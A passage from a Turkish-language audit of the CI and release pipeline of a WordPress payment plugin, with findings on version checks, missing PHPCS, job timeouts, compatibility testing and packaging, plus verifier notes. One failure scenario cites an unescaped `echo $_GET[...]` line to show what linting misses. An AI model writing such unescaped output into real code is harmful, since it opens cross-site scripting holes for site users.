| **Konum** | [.github/scripts/check-version.js:85](../../../.github/scripts/check-version.js#L85) |
| **Güven** | high |
| **Doğrulama** | ✅ Doğrulandı (1/1) |

**Sorun ve kanıt**

```javascript
check-version.js:85-95 yalnızca beş kaynağı karşılaştırıyor: `['Plugin header', headerVersion], ['NICEPAY_VERSION', constantVersion], ['CHANGELOG.md latest entry', changelogVersion], ['Test bootstrap NICEPAY_VERSION', bootstrapVersion], ['Translation template Project-Id-Version', potVersion]`. `readme.txt` script'te hiç okunmuyor (31-43. satırlardaki `read()` çağrılarında yok) ve `package.json` da yok. readme.txt'nin Stable tag'i SADECE deploy-wordpress-org.yml:103-115'te kontrol ediliyor — yani GitHub release yolunda hiç kontrol edilmiyor. package.json:3 `"version": "2.0.0"` hiçbir yerde doğrulanmıyor.
```

**Başarısızlık senaryosu**

2.1.0 hazırlanır; check-version.js'in zorunlu tuttuğu beş dosya güncellenir ama readme.txt:6 `Stable tag: 2.0.0` ve package.json:3 `"version": "2.0.0"` unutulur. `composer quality`, `lint`, `package` ve `release.yml` tamamen yeşil geçer; `nicepay-payment-gateway-2.1.0.zip` içinde `Stable tag: 2.0.0` yazan bir readme.txt ile yayımlanır. Aylar sonra WP.org publish denenince deploy prepare job'ı 112-115. satırda patlar ve o ana kadar dağıtılmış tüm GitHub paketlerinin metadata'sı tutarsız kalır.

**Etki**

build-release.sh:58 readme.txt'yi pakete kopyaladığı için, bayat `Stable tag: 2.0.0` değeri taşıyan bir 2.1.0 ZIP'i GitHub Releases'e çıkabilir. WordPress.org yolunda ise ilk publish denemesinde prepare job'ı hata verip release'i geç aşamada bloke eder — hata mümkün olan en erken noktada değil, en geç noktada yakalanır. package.json'ın sürümü ise kalıcı olarak sürüklenir ve 'sürüm tek kaynaktan yönetiliyor' iddiasını zayıflatır.

**Öneri**

check-version.js'e iki kaynak daha ekle:
```js
const readme = read('readme.txt', path.join(repositoryRoot, 'readme.txt'));
const packageJson = read('package.json', path.join(repositoryRoot, 'package.json'));
const stableTag = capture(readme, /^Stable tag:\s*([^\s]+)\s*$/m, 'readme.txt Stable tag');
const packageVersion = capture(packageJson, /"version"\s*:\s*"([^"]+)"/, 'package.json version');
```
ve 85-90'daki listeye `['readme.txt Stable tag', stableTag], ['package.json version', packageVersion]` satırlarını ekle. Böylece deploy workflow'undaki tekrar eden kontrol de tek kaynağa iner (deploy-wordpress-org.yml:103-115 sadeleşir).

---

### CI-005 — .codacy.yml PHPCS'i bütün PHP dosyaları için kapatıyor ve repoda hiç PHPCS/WPCS/PHPStan yok — PHP statik analizi fiilen 'php -l' seviyesinde

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | quality-gate |
| **Konum** | [.codacy.yml:9](../../../.codacy.yml#L9) |
| **Güven** | high |
| **Doğrulama** | ✅ Doğrulandı (1/1) |

**Sorun ve kanıt**

````yaml
.codacy.yml:9-12:
```yaml
  phpcs:
    exclude_paths:
      - "*.php"
      - "**/*.php"
```
Bu, PHPCS motorunu bir PHP projesinde tamamen etkisiz hale getirir. Yorum (satır 6-8) 'PHP security remains covered by Opengrep, SonarCloud, and the PHP CI matrix' diyor, ama composer.json:15-17 require-dev'de yalnızca `phpunit/phpunit: ^9.6` var — squizlabs/php_codesniffer, wp-coding-standards/wpcs, phpstan veya psalm yok. composer.json:27 `"lint:php": "bash .github/scripts/lint-php.sh"` ve lint-php.sh:8 `php -l "$php_file"` — yani 'PHP CI matrix' sadece sözdizimi kontrolü yapıyor. tests.yml içinde de PHPCS/PHPStan adımı yok.
````

**Başarısızlık senaryosu**

Bir katkıda bulunan `echo $_GET['moid'];` benzeri escape edilmemiş bir admin çıktısı ekler. `php -l` geçer, PHPUnit testleri bu satıra dokunmaz, Codacy PHPCS devre dışı olduğu için hiçbir şey demez. Kod merge edilir ve WP.org incelemesinde 'Sanitize/escape' gerekçesiyle reddedilir — ya da daha kötüsü, hiç incelenmeden GitHub kanalından yayılır.

**Etki**

~7.000 satırlık, para hareketi işleyen PHP kodu için CI'da tek otomatik PHP kontrolü `php -l`. WordPress.org Plugin Check ve WPCS'in yakaladığı sınıf (escaping eksikliği, `$_POST` doğrudan kullanımı, prepare'sız SQL, i18n hataları, yasak fonksiyonlar) hiçbir kapıdan geçmiyor. Ayrıca `exclude_paths: "*.php"` bir kural yapılandırması değil, bulguları susturmadır: Codacy rating'i yapay olarak yüksek görünür.

**Öneri**

Codacy'nin bundled profili yerine projeye özel bir ruleset kullan ve motoru tamamen kapatma. composer.json'a ekle:
```json
"require-dev": {
    "phpunit/phpunit": "^9.6",
    "squizlabs/php_codesniffer": "^3.9",
    "wp-coding-standards/wpcs": "^3.1",
    "phpcompatibility/phpcompatibility-wp": "^2.1"
}
```
Repoya bir `phpcs.xml.dist` koy (WordPress-Extra + WordPress.Security + PHPCompatibilityWP, `testVersion 7.4-8.3`), `"lint:phpcs": "phpcs -q"` script'ini `quality` zincirine ekle ve tests.yml `lint` job'ında çalıştır. .codacy.yml'de phpcs bloğunu kaldır; Codacy artık repo ruleset'ini kullanır. Ek olarak WP.org öncesi `wordpress/plugin-check` çalıştıran bir CI adımı ekle.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `confirmed`)

- Gerekçe: Her dosya ve satır referansı bire bir doğrulandı; iddiayı çürütecek hiçbir telafi edici kapı bulunamadı.

1) `.codacy.yml` (PR'da YENİ eklenen dosya — `git diff --stat origin/main...development` 19 satır ekleme gösteriyor) satır 9-12'de `phpcs` motoru için `exclude_paths: ["*.php", "**/*.php"]` tanımlı. Bu bir kural ayarı değil, motorun tüm girdi kümesini boşaltmaktır; bir PHP projesinde PHPCS fiilen kapatılmış olur. Ayrıca dosya kökündeki genel `exclude_paths` (13-19) `tests/**`, `docs/analysis/**`, `build/**` gibi ağaçları da tüm motorlardan çıkarıyor.

2) Telafi arayışı: repoda `phpcs.xml`, `phpcs.xml.dist`, `phpstan.neon`, `psalm.xml` YOK. `find . -name "phpcs*" -o -name "phpstan*" -o -name "psalm*"` yalnızca `./vendor/doctrine/instantiator/psalm.xml` (üçüncü parti) döndürdü. Repo kökünde ne sonar-project.properties ne opengrep/semgrep kuralı var; `.codacy.yml:8` yorumundaki "Opengrep, SonarCloud" tamamen Codacy tarafındaki barındırılan motorlara dayanıyor ve repoda hiçbir izleri yok (dolayısıyla PR üzerinden denetlenemez/versiyonlanamaz).

3) `composer.json:15-17` require-dev gerçekten yalnızca `phpunit/phpunit: ^9.6`. WPCS/php_codesniffer/phpstan yok. `composer.json:27` `"lint:php": "bash .github/scripts/lint-php.sh"`, `30-34` `quality` zinciri = lint:php + lint:js + check-version.

4) `.github/scripts/lint-php.sh:8` gerçekten `php -l "$php_file"` — sadece sözdizimi. (Script vendor ve tests/coverage hariç tüm PHP'yi tarıyor, ama yaptığı iş yine parse kontrolü.)

5) `tests.yml`'de PHPCS/PHPStan/plugin-check adımı yok. `lint` job'ının adı bile "Syntax and release metadata" (satır 75); satır 110-111 `composer quality`. Tüm workflow (160 satır) okundu; `test` job'ı sadece phpunit, diğerleri DB/WC entegrasyon ve paket smoke.

6) Doküman-kod uyuşmazlığı iddiayı ayrıca güçlendiriyor: `CONTRIBUTING.md:155` "Follow the WordPress PHP Coding Standards" diyor ama hiçbir makine kapısı bunu zorlamıyor. Repo'nun kendi analiz dokümanları da aynı boşluğu bağımsız olarak kaydetmiş (RELEASE-09, TESTS-23, PLATFORM-39) ve `docs/analysis/06-...:1449` "the CI lint job does `php -l` only" diyor; `docs/analysis/14-remediation-progress.md:66` PHPCS/PHPStan borcunu hâlâ AÇIK ("KISMİ") olarak işaretliyor — yani PR yazarı bile bu kapının kapatılmadığını kabul ediyor.

Severity `medium` uygun: sömürülebilir bir açık değil, ama para hareketi işleyen ~7k satır PHP için tek otomatik kapı parse kontrolü ve WP.org inceleme riski gerçek.

---

### CI-006 — tests.yml'deki hiçbir job'da timeout-minutes yok; docker tabanlı entegrasyon job'ları 6 saate kadar asılı kalabilir

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | ci-robustness |
| **Konum** | [.github/workflows/tests.yml:113](../../../.github/workflows/tests.yml#L113) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 kısmen |

**Sorun ve kanıt**

```yaml
tests.yml'deki beş job (`test`:18, `lint`:74, `database-integration`:113, `woocommerce-integration`:124, `package`:135) hiçbirinde `timeout-minutes` yok — GitHub varsayılanı 360 dakikadır. Buna karşılık deploy-wordpress-org.yml:38 ve :213 doğru şekilde `timeout-minutes: 15`/`20` taşıyor, yani kalıp bilinip uygulanmamış. Entegrasyon script'leri anonim Docker Hub pull'ları ve ağ bağımlı adımlar içeriyor: run-woocommerce-smoke.sh:97 `wp plugin install woocommerce --version=11.0.1` (wordpress.org'dan runtime indirme), run-schema-migration.sh:46-53 `for _attempt in $(seq 1 30); ... sleep 2` döngüleri.
```

**Başarısızlık senaryosu**

Docker Hub anonim pull limiti dolar. `database-integration` job'ı `docker run ... mariadb@sha256:...` adımında 'toomanyrequests' beklemesine girer; `seq 1 30` ping döngüsü 60 saniyede biter ama `docker run` komutunun kendisi retry/backoff'ta takılır. Job 360 dakika sonra timeout ile ölür; PR o gün merge edilemez ve gerçek nedeni gösteren bir mesaj yoktur.

**Etki**

Docker Hub anonim pull rate-limit'i, wordpress.org indirme kesintisi veya `wp core install` sırasında asılı kalan bir MariaDB, job'ı 6 saat boyunca canlı tutar. Bu süre boyunca `concurrency` grubu meşgul kalır, runner dakikaları yanar ve `package` job'ı `needs` nedeniyle asla başlamaz — geri bildirim döngüsü saatlere çıkar. Hata mesajı da 'The job running on runner ... has exceeded the maximum execution time' gibi teşhis değeri sıfır bir çıktı olur.

**Öneri**

Her job'a gerçekçi bir üst sınır koy ve deploy workflow'undaki kalıbı yay:
```yaml
  test:
    timeout-minutes: 20
  lint:
    timeout-minutes: 20
  database-integration:
    timeout-minutes: 25
  woocommerce-integration:
    timeout-minutes: 30
  package:
    timeout-minutes: 15
```
Ayrıca entegrasyon script'lerindeki hazırlık döngülerine toplam süre sınırı ekleyip başarısızlıkta `docker logs "$database_container"` çıktısını bas — böylece timeout yerine anlamlı bir hata görülür.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: tests.yml'deki beş job'ın (test:18, lint:74, database-integration:113, woocommerce-integration:124, package:135) hiçbirinde `timeout-minutes` yok; ayrıca release.yml:16'daki `release` job'ında da yok ve release.yml:12 `verify` aynı tests.yml'i `workflow_call` ile çağırdığı için sınırsızlık tag release yoluna da yayılıyor. GitHub varsayılanı 360 dakikadır; oysa deploy-wordpress-org.yml:38 ve :213 doğru kalıbı (`timeout-minutes: 15`/`20`) zaten uyguluyor. Asılma riski iddiadaki gibi Docker Hub rate-limit'inden değil (o hızlı `toomanyrequests` hatası verir), zaman aşımsız AĞ adımlarından gelir: run-woocommerce-smoke.sh:95-97'deki `wp core install` ve `wp plugin install woocommerce --version=11.0.1` wordpress.org indirmeleri, `docker pull`/`docker exec` stall'ları — `grep -rn "timeout|--wait|health-cmd" tests/integration/*.sh` hiçbir sınır bulmuyor. Buna karşılık script'lerdeki hazırlık döngüleri (run-schema-migration.sh:46-56, :68; run-woocommerce-smoke.sh:50, :72) ZATEN 30x2s ile sınırlı ve `ERROR: disposable MariaDB did not become ready` benzeri anlamlı mesaj basıyor; oradaki tek gerçek eksik başarısızlıkta `docker logs "$database_container"` çıktısının dökülmemesi. Düzeltme: her job'a `timeout-minutes` ekle (release.yml:16 dahil) ve ağ bağımlı komutları `timeout 300 ...` ile sar.
- Gerekçe: Çekirdek iddia tamamen doğrulandı: tests.yml'de `timeout` kelimesi hiç geçmiyor (`grep -n "timeout" .github/workflows/tests.yml` -> eşleşme yok, dosya 160 satır), belirtilen beş job satır numarası birebir doğru (test:18, lint:74, database-integration:113, woocommerce-integration:124, package:135), deploy-wordpress-org.yml:38 ve :213'te `timeout-minutes: 15`/`20` gerçekten var, yani kalıp repoda mevcut ama tests.yml'e uygulanmamış. İddiayı çürüten hiçbir koruma yok: job/step düzeyinde başka timeout, docker `--health-cmd`, `--wait` veya `timeout` sarmalayıcısı entegrasyon script'lerinde bulunmuyor.

Üç noktada düzeltme gerekiyor:

1) İddia KAPSAMI EKSİK ANLATIYOR (iddia lehine): release.yml:16'daki `release` job'ı da `timeout-minutes` taşımıyor ve release.yml:12 `verify` job'ı tests.yml'i `workflow_call` ile çağırdığı için aynı sınırsızlık tag push'larında da geçerli. Yani sorun 5 job değil, sürüm yayınlama yolunu da kapsıyor.

2) BAŞARISIZLIK SENARYOSU DETAYI YANLIŞ: Docker Hub anonim pull limiti `docker run` sırasında saatlerce "asılı kalma" değil, hızlı bir `toomanyrequests` HATASI üretir; `set -e`/script akışı bunu dakikalar içinde başarısız kılar. Gerçekçi asılma yolları başkadır: `wp core install` / `wp plugin install woocommerce --version=11.0.1` (run-woocommerce-smoke.sh:97) çağrılarının wordpress.org'a yaptığı HTTP indirmelerinin TCP düzeyinde stall etmesi, `docker exec ... mariadb-admin ping` veya `wp eval-file` komutunun yanıtsız kalması — bunların hiçbirinde istemci tarafı zaman aşımı yok. Yani etki doğru, mekanizma yanlış.

3) ÖNERİNİN İKİNCİ YARISI KISMEN GEREKSİZ: "hazırlık döngülerine toplam süre sınırı ekle" — bu döngüler ZATEN sınırlı ve anlamlı hata basıyor: run-schema-migration.sh:46-56 `for _attempt in $(seq 1 30) ... sleep 2` + `echo 'ERROR: disposable MariaDB did not become ready' >&2; exit 1` (aynı kalıp :68, ve run-woocommerce-smoke.sh:50, :72). Yani ping döngüsü 60 saniyede deterministik olarak biter. Geçerli kalan kısım sadece `docker logs "$database_container"` çıktısının basılmaması ve döngü DIŞINDAKİ (docker pull, wp-cli, ağ) adımların sınırsız olması.

Severity: medium doğru — veri kaybı/güvenlik yok, ama concurrency grubu + `package` job'ının `needs: [test, lint, database-integration, woocommerce-integration]` (tests.yml:138) zinciri nedeniyle geri bildirim döngüsü gerçekten saatlere çıkabilir.

---

### CI-007 — Uyumluluk beyanları test kanıtıyla eşleşmiyor: WooCommerce yalnızca 11.0.1'de, WordPress ise adı belirsiz bir docker digest'inde test ediliyor; 'WC requires at least: 5.0' ve 'Tested up to: 7.0' hiçbir kapı tarafından doğrulanmıyor

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | test-coverage |
| **Konum** | [tests/integration/run-woocommerce-smoke.sh:14](../../../tests/integration/run-woocommerce-smoke.sh#L14) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 kısmen |

**Sorun ve kanıt**

```bash
run-woocommerce-smoke.sh:14 `woocommerce_version='11.0.1'` — tek ve sabit bir WooCommerce sürümü. Buna karşılık nicepay-payment-gateway.php:14 `* WC requires at least: 5.0` ve CONTRIBUTING.md:44 'WooCommerce 5.0+ (for gateway testing)'. WordPress tarafında ise run-woocommerce-smoke.sh:12 ve run-schema-migration.sh:12 `wordpress_image='wordpress@sha256:b427cec...'` — CLI imajının aksine (satır 13'te `# CLI 2.12.0, PHP 8.2` yorumu var) bu digest'in hangi WordPress sürümü olduğu yorumla bile belirtilmemiş. readme.txt:4 `Tested up to: 7.0` iddiasını doğrulayan hiçbir CI adımı yok; check-version.js:81-83 sadece `Requires at least` alanının '5.8' olmasını zorunlu tutuyor, `Tested up to`'ya hiç bakmıyor.
```

**Başarısızlık senaryosu**

WC 5.0 çalıştıran bir mağaza eklentiyi kurar. `class-nicepay-blocks-integration.php` veya HPOS uyumluluk beyanı (`FeaturesUtil::declare_compatibility`, WC 7.x+) fatal error üretir veya gateway hiç listelenmez. CI bu senaryoyu hiç görmemiştir çünkü matris yalnızca WC 11.0.1 kurmaktadır. Simetrik olarak, `wordpress` digest'i WP 6.8'e karşılık geliyorsa readme.txt'deki 'Tested up to: 7.0' beyanı WP.org kurallarına aykırı, kanıtsız bir iddiadır.

**Etki**

Beyan edilen minimum (WC 5.0 / WP 5.8) hiç test edilmiyor: 'legacy/HPOS matrisi' aslında bir SÜRÜM matrisi değil, tek sürüm üzerinde iki DEPOLAMA modu. WC 5.0'da mevcut olmayan API'lere (ör. HPOS/`FeaturesUtil`, Blocks entegrasyonu) yapılan bir çağrı CI'da asla yakalanmaz. Ayrıca docs/WORDPRESS-ORG-RELEASE.md:184'teki 'Tested up to ve WooCommerce uyumluluk beyanları test kanıtıyla eşleşiyor' kontrol maddesi otomatik olarak doğrulanamaz; imaj digest'i yükseltildiğinde readme.txt sessizce yanlış hale gelir.

**Öneri**

1) WC matrisini gerçekten matris yap: `strategy.matrix.woocommerce: ['5.0.0', '8.9.3', '11.0.1']` ve script'e `WOOCOMMERCE_VERSION` env'i ile parametre geçir (HPOS ayağını yalnızca >= 7.1 için çalıştır).
2) WordPress imajının sürümünü hem yoruma yaz hem de CI'da doğrula:
```bash
wp_version="$("${wp_cli[@]}" "$wp_cli_image" wp core version --allow-root | tr -d '\r')"
readme_tested="$(sed -nE 's/^Tested up to:[[:space:]]*([^[:space:]]+).*/\1/p' readme.txt)"
[[ "$wp_version" == "$readme_tested"* ]] || { echo "ERROR: readme 'Tested up to' ($readme_tested) does not match the tested WordPress ($wp_version)" >&2; exit 1; }
```
3) `Requires at least: 5.8` iddiası için en az bir WP 5.8 imajıyla aktivasyon smoke testi ekle.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Beyan edilen uyumluluk tabanları ve tavanları hiçbir otomatik kapı tarafından doğrulanmıyor: (a) `nicepay-payment-gateway.php:14` `WC requires at least: 5.0` ve `CONTRIBUTING.md:44` "WooCommerce 5.0+" iddiasına karşılık CI yalnızca `tests/integration/run-woocommerce-smoke.sh:14`'teki sabit `woocommerce_version='11.0.1'` sürümünü kuruyor; `.github/workflows/tests.yml`'deki tek `strategy.matrix` anahtarı `php`, yani "legacy/HPOS matrisi" bir sürüm matrisi değil tek sürüm üzerindeki iki depolama modudur. (b) `readme.txt:4` `Tested up to: 7.0` iddiasını doğrulayan hiçbir CI adımı yok; `check-version.js` readme.txt'yi hiç okumuyor ve yalnızca header'daki `Requires at least`'in '5.8' olmasını zorunlu kılıyor (satır 81-83), `Requires at least: 5.8` iddiası için de WP 5.8 üzerinde aktivasyon testi yok. (c) `run-woocommerce-smoke.sh:12` ve `run-schema-migration.sh:12`'deki WP imajı digest'i, hemen altındaki CLI imajının aksine sürüm yorumu taşımıyor; digest yükseltildiğinde `readme.txt` sessizce yanlış hale gelir ve `docs/WORDPRESS-ORG-RELEASE.md:184`'teki "test kanıtıyla eşleşiyor" maddesi tamamen manuel kalır. Ek olarak header'da `WC tested up to` alanı hiç yok. DÜZELTME: iddianın failure_scenario'sunda gösterilen iki somut fatal-error yolu geçersizdir — `FeaturesUtil::declare_compatibility` çağrısı `nicepay-payment-gateway.php:42`'de `class_exists` ile, Blocks entegrasyonu ise satır 313'teki `class_exists` erken return'ü ve satır 96'daki `woocommerce_blocks_loaded` hook'u ile korunuyor; eski WC'de bunlar sessizce atlanır. Risk "bugün fatal error var" değil, "guard'sız yeni bir modern-WC API'si eklendiğinde CI bunu asla yakalamaz + WP.org'a kanıtsız beyan gönderilir" şeklindedir. Ayrıca önerilen tek boyutlu `matrix.woocommerce` yetersizdir: WC 11.0.1 modern WP gerektirdiğinden matris WP × WC olarak iki boyutlu kurulmalıdır.
- Gerekçe: Çekirdek iddia — beyan edilen uyumluluk sınırlarının hiçbir CI kapısıyla doğrulanmaması — tamamen doğrulandı ve verilen TÜM satır numaraları dosyaların şu anki haliyle birebir eşleşiyor. Tek WooCommerce sürümü (11.0.1) sabit kodlanmış; `.github/workflows/tests.yml`'de WC veya WP boyutu olan bir `strategy.matrix` yok (yalnızca `matrix.php` var). WP imajı digest'i gerçekten yorumsuz; komşu satırdaki CLI imajı ise yorumlanmış — yani tutarsızlık iddiası da doğru. `Tested up to: 7.0` için repo genelinde tek bir doğrulama yok: grep sadece readme.txt:4, docs/WORDPRESS-ORG-RELEASE.md (85 ve 184 — ikisi de manuel prosa/checklist) ve docs/analysis/* arşiv dosyalarını buluyor; `.github/scripts/check-version.js` içinde "readme" kelimesi hiç geçmiyor, yalnızca plugin header'ının `Requires at least` alanını '5.8' olarak zorluyor (satır 81-83). "Legacy/HPOS matrisi bir sürüm matrisi değil, tek sürüm üzerinde iki depolama modu" tespiti de run-woocommerce-smoke.sh:97-108'de birebir doğrulandı.

ANCAK failure_scenario'nun somut mekanizması çürütüldü. İddia "`FeaturesUtil::declare_compatibility` veya Blocks entegrasyonu WC 5.0'da fatal error üretir" diyor; her iki çağrı yeri de `class_exists` guard'ı ile korunuyor:
- nicepay-payment-gateway.php:42 — `if ( class_exists( '\\Automattic\\WooCommerce\\Utilities\\FeaturesUtil' ) )`
- nicepay-payment-gateway.php:313 — `if ( ! class_exists( '\\Automattic\\WooCommerce\\Blocks\\Payments\\Integrations\\AbstractPaymentMethodType' ) )` (erken return) ve Blocks sınıfı zaten yalnızca `woocommerce_blocks_loaded` (satır 96) üzerinden yükleniyor, yani `AbstractPaymentMethodType` yoksa `class-nicepay-blocks-integration.php` hiç parse edilmiyor.
Dolayısıyla iddianın gösterdiği iki spesifik API için fatal error senaryosu gerçekleşmez. Kalan risk gerçektir ama daha zayıftır: WC 5.0'da guard'sız başka bir API kullanımı CI'da yakalanmaz ve "beyan ≠ kanıt" boşluğu aynen durur.

İkinci bir detay düzeltmesi: önerilen `matrix.woocommerce: ['5.0.0', ...]` tek başına çalışmaz — script tek bir WP imajı digest'i kullanıyor ve WC 11.0.1 modern WP gerektirdiği için WC 5.0 ayağı ayrıca uyumlu bir WP imajı gerektirir; matris iki boyutlu (WP × WC) olmak zorunda.

Ek gözlem (iddiada yok, lehine): plugin header'da `WC tested up to` alanı hiç yok — yalnızca `WC requires at least: 5.0` var, yani WooCommerce tarafında bir tavan beyanı bile mevcut değil.

Severity medium olarak doğru: bu bir çalışma zamanı bug'ı değil, kanıtlanmamış uyumluluk beyanı / test kapsamı boşluğu; wordpress.org kuralları açısından gerçek bir risk ama üretimde doğrudan hataya yol açtığı gösterilemedi.

---

### CI-008 — WordPress.org payload'ı yeniden paketlendikten sonra smoke-check tekrar çalıştırılmıyor; yerine geçen inline grep çok daha zayıf bir kontrol

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | release-process |
| **Konum** | [.github/workflows/deploy-wordpress-org.yml:177](../../../.github/workflows/deploy-wordpress-org.yml#L177) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 kısmen |

**Sorun ve kanıt**

````yaml
deploy-wordpress-org.yml:152-153 önce `build-release.sh` + `smoke-check-artifact.sh` çalıştırıyor (doğru), ancak 155-170'te paket açılıyor, dizin yeniden adlandırılabiliyor (158), readme.txt üzerine kopyalanıyor (160) ve YENİDEN zip'leniyor (169). Bu yeni `$payload_zip` için yapılan tek kontrol 172-180 arasındaki listedir:
```bash
unzip -t "$payload_zip" >/dev/null
grep -Fxq "$PLUGIN_SLUG/readme.txt" <<< "$archive_listing"
grep -Fxq "$PLUGIN_SLUG/nicepay-payment-gateway.php" <<< "$archive_listing"
if grep -Eq '(^|/)(\.git|\.github|tests|vendor|node_modules|docs/analysis)(/|$)' ...
```
Oysa smoke-check-artifact.sh:48-57'de üç yasaklı desen grubu var (ek olarak `build` ve `composer.json|composer.lock|package.json|package-lock.json|eslint.config.js|phpunit.xml|.env`), 59-62'de tek üst-dizin kısıtı, 79-85'te ise açılan paketteki HER PHP dosyasına `php -l` ve her JS dosyasına `node --check` uygulanıyor. Nihai WP.org payload'ı bunların hiçbirinden geçmiyor. Üstelik sha256 (182) ve publish job'ının doğruladığı zincir (277-285) bu ZAYIF doğrulanmış zip üzerine kuruluyor.
````

**Başarısızlık senaryosu**

`cp readme.txt "$stage_dir/$PLUGIN_SLUG/readme.txt"` (satır 160) bir gün `cp readme.txt phpunit.xml "$stage_dir/$PLUGIN_SLUG/"` gibi bir düzenlemeyle genişletilir veya PLUGIN_SLUG farklı olduğu için `mv` sonrası bir yol yanlış kurulur. 177. satırdaki grep `phpunit` desenini içermediğinden geçer; payload sha256'lanır, publish job'ında `sha256sum --check` doğrular ve `phpunit.xml` WordPress.org trunk'ına commit edilir. WP.org otomatik taraması eklentiyi askıya alır.

**Etki**

Chain-of-custody'nin başladığı nokta, en az doğrulanmış artefakt. Yeniden paketleme adımına (ör. gelecekte eklenecek bir `cp`/`sed` adımı) sızacak `composer.json`, `phpunit.xml`, `.env` veya bozuk bir PHP dosyası, sha256 ile mühürlenip WordPress.org SVN trunk'ına gider. WP.org'a gönderilen paket, GitHub'a gönderilen paketten farklı ve daha az doğrulanmış olur.

**Öneri**

Yeniden paketleme sonrası aynı script'i tekrar çalıştır. smoke-check-artifact.sh'ı slug parametreli yap (`plugin_slug="${2:-nicepay-payment-gateway}"`) ve deploy'da 172-180 arasındaki inline grep'i şununla değiştir:
```bash
bash .github/scripts/smoke-check-artifact.sh "$payload_zip" "$PLUGIN_SLUG"
```
Böylece php -l/node --check, tam yasaklı-yol listesi ve tek üst-dizin kısıtı WP.org payload'ı için de geçerli olur ve iki yerde ayrı ayrı bakım gerektiren kontrol listesi teke iner.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Severity düzeltmesi: `medium` → `low`
- Düzeltilmiş iddia: WordPress.org payload'ı yeniden paketlendikten sonra `smoke-check-artifact.sh` tekrar çalıştırılmıyor; yerine geçen inline kontrol (deploy-wordpress-org.yml:172-180) script'in yasaklı-yol listesinin yalnızca bir alt kümesini, tek üst-dizin kısıtını ve `php -l`/`node --check` adımlarını içermiyor. BUGÜN bu bir içerik farkı üretmiyor: build-release.sh:4,58 zaten aynı checkout'tan `readme.txt`'yi kopyaladığı için deploy:160'taki `cp readme.txt ...` bit-bit aynı dosyayı yazan bir NO-OP'tur ve source_zip ile payload_zip arasındaki tek gerçek delta üst-dizin adıdır (157-158). Dolayısıyla bulgu, sömürülebilir bir zafiyet değil; (a) yeniden paketleme adımına gelecekte eklenecek herhangi bir `cp`/`sed`'in `phpunit.xml`, `composer.json`, `.env` gibi dosyaları sessizce sızdırabileceği bir savunma-derinliği boşluğu ve (b) aynı yasaklı-yol listesinin iki ayrı yerde bakım gerektirdiği bir tutarlılık borcudur. Ayrıca `set -euo pipefail` (satır 146) ve 174-175'teki tam yol grep'leri, iddiadaki "mv sonrası yanlış yol" alt-senaryosunu çürütür. Öneri geçerlidir ve script'in satır 5'teki hardcode `plugin_slug`'ının parametreleştirilmesini gerektirir.
- Gerekçe: Yapısal çekirdek DOĞRU ve satır referansları birebir tutuyor: WP.org payload'ı yeniden zip'lendikten sonra `smoke-check-artifact.sh` tekrar çalıştırılmıyor; yerine 172-180'de daha dar bir inline kontrol var. Eksik olanlar gerçek: (a) yasaklı desen listesi kısaltılmış — `build`, `composer.json|lock`, `package(-lock).json`, `eslint.config.js`, `phpunit.xml`, `.env` inline grep'te YOK (script satır 51'de var); (b) tek üst-dizin kısıtı (script 59-62) yok; (c) `php -l` / `node --check` (script 79-85) yok; (d) 25 zorunlu dosyalık liste (script 15-46) yerine sadece 2 dosya kontrol ediliyor (174-175). sha256 (182) ve publish job'ının doğruladığı zincir (277-285) gerçekten bu zayıf doğrulanmış zip üzerine kuruluyor. Ayrıca öneri de teknik olarak yerinde: script satır 5'te `plugin_slug='nicepay-payment-gateway'` HARDCODE olduğu için, yeniden çalıştırmadan önce parametreleştirme şart — iddia bunu doğru tespit etmiş.

ANCAK iddianın etki/severity kısmı abartılı, iki noktada düzeltme gerekiyor:

1. "WP.org'a gönderilen paket, GitHub'a gönderilenden FARKLI" — bugün içerik olarak farklı değil. build-release.sh satır 4 `repository_root` = workspace ve satır 58 zaten `readme.txt`'yi aynı checkout'tan `$package_root/`'a kopyalıyor. deploy satır 160'taki `cp readme.txt "$stage_dir/$PLUGIN_SLUG/readme.txt"` AYNI kaynak dosyayı aynı hedefin üzerine yazan bir NO-OP. Dolayısıyla source_zip ile payload_zip arasındaki tek gerçek delta üst-dizin adıdır (satır 157-158). Yani smoke-check'in yeniden çalıştırılması bugün hiçbir yeni sözdizimi/yasaklı-yol bulgusu üretmezdi: dosya içerikleri bit-bit aynı.

2. Başarısızlık senaryosunun ikinci yarısı ("PLUGIN_SLUG farklı olduğu için mv sonrası bir yol yanlış kurulur") geçersiz: adım `set -euo pipefail` (satır 146) altında; `mv` başarısız olursa job düşer, ayrıca 174-175'teki `grep -Fxq "$PLUGIN_SLUG/readme.txt"` ve `"$PLUGIN_SLUG/nicepay-payment-gateway.php"` yanlış yol kurulumunu yakalar. Senaryonun BİRİNCİ yarısı (gelecekte `cp` satırının genişletilmesiyle `phpunit.xml` gibi bir dosyanın sızması) ise geçerlidir — inline grep'te `phpunit` deseni gerçekten yok.

Sonuç: bu bir bugün-sömürülebilir zafiyet değil, gerçek bir savunma-derinliği + bakım yükü bulgusu (iki ayrı yerde ayrı ayrı bakılan yasaklı-yol listesi). Bu yüzden medium değil low.

---

### CI-009 — Neyin paketleneceği dört ayrı yerde tanımlı (build script, smoke-check, deploy inline grep, .gitattributes) — kaçınılmaz drift

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | maintainability |
| **Konum** | [.github/scripts/build-release.sh:41](../../../.github/scripts/build-release.sh#L41) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 kısmen |

**Sorun ve kanıt**

```bash
